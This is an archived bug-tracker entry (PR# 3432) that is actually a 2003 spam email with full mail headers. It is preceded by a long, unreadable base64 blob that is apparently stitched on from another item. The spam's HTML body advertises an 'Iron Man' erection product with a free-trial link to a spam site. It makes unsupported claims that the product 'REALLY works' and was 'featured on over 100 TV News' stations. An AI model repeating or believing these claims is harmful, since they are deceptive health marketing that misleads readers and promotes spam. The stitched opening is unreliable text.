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
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3432 *
Subject: Increases circulation in men for erections.
From: "Simone Mejia" <t4943j7xly@qualitylooseleaf.com>
Date: Tue, 08 Jul 03 09:45:56 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3432 <==
From t4943j7xly@qualitylooseleaf.com Tue Jul  8 10:50:00 2003
Received: from h00e0183be3a3.ne.client2.attbi.com (h00e0183be3a3.ne.client2.attbi.com [66.31.37.108])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h688mVJH029308;
	Tue, 8 Jul 2003 10:49:56 +0200 (MET DST)
Received: from 5qcy4.y3l5.com [73.196.104.236]
	by h00e0183be3a3.ne.client2.attbi.com with ESMTP id 62423669;
	Tue, 08 Jul 2003 09:45:56 +0100
Message-ID: <i75eij3$j7$$04l-si@ninim5>
From: "Simone Mejia" <t4943j7xly@qualitylooseleaf.com>
To: p.dalgaard@biostat.ku.dk
Subject: Increases circulation in men for erections.
Date: Tue, 08 Jul 03 09:45:56 GMT
X-Mailer: Microsoft Outlook, Build 10.0.2627
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="8BFC_0A15FCCA."
X-Priority: 3
X-MSMail-Priority: Normal

This is a multi-part message in MIME format.

--8BFC_0A15FCCA.
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<!-- saved from url=3D(0022)http://internet.e-mail -->
<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html;charset=3Diso-8859-=
1">
<table border=3D"1" cellpadding=3D"0" cellspacing=3D"0" style=3D"border-co=
llapse: collapse" bordercolor=3D"#FF0000" width=3D"515" id=3D"AutoNumber2"=
>
  <tr> 
    <td bgcolor=3D"#FFFF00"> 
      <p align=3D"center"><b><font face=3D"Arial"><font face=3D"Arial,Helv=
etica"><b>Iron 
        Man</b> has been featured on over 100 TV News and <br>
        Top Radio stations across America, and we know why...</font> <br>
        <font face=3D"Arial,Helvetica">It REALLY works!</font></font> </b>=
 
    </td>
  </tr>
  <tr> 
    <td> 
      <p align=3D"center"><font face=3D"Verdana" color=3D"#FF0000"><a href=
=3D"http://random.liljoesmith.com/h/iron.html"><br>
        click here now!</a></font></p>
      <div align=3D"center"> 
        <table width=3D"96%" border=3D"0">
          <tr>
            <td width=3D"6%">&nbsp;</td>
            <td width=3D"90%"> 
              <div align=3D"center">
                <p align=3D"center"><font face=3D"Verdana" color=3D"#FF000=
0"><b>FREE 
                  TRIAL OFFFER!<br>
                  </b></font></p>
                <div align=3D"left"> 
                  <ul>
                    <li> <font face=3D"Arial,Helvetica">Dramatically Enhan=
ces Organism</font> 
                    </li>
                    <li><font face=3D"Arial,Helvetica">Number 1 formula fo=
r men</font> 
                    </li>
